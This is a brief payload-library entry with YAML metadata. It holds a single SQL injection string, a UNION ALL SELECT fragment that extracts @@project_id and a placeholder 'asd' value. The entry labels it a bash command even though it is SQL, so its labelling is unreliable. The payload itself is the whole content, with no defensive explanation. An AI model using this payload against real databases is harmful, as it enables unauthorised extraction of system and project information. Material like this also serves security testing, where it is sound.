---
id: cdc7abe6-1592-4196-9af1-62d8e21d21f5
name: Performing UNION ALL SELECT operation with @@project_id and 'asd'
type: command
executor: bash
data: UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name
  UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name
output: null
created_at: '2023-04-06T03:56:32.353245+00:00'
updated_at: '2023-04-10T20:21:05.529526+00:00'
---

# Performing UNION ALL SELECT operation with @@project_id and 'asd'

```bash
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name
```
